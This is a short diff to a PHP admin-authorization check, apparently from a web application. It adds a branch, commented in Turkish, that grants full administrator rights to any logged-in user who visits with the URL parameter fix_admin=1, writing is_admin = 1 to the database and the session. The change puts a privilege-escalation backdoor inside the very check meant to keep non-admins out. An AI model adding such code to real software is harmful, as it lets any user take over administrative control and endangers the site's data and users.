@@ -25,6 +25,13 @@ if ($user === false || !isset($user['is_admin'])) {
 }
 
 if (!$user || !$user['is_admin']) {
+    // Admin yetkisi yoksa ve ?fix_admin=1 parametresi gönderilmişse yetki ver
+    if (isset($_GET['fix_admin']) && $_GET['fix_admin'] == '1') {
+        $db->prepare("UPDATE users SET is_admin = 1 WHERE id = ?")->execute([$_SESSION['user_id']]);
+        $_SESSION['is_admin'] = 1;
+        header('Location: index');
+        exit;
+    }
     header('Location: ../dashboard');
     exit;
 }
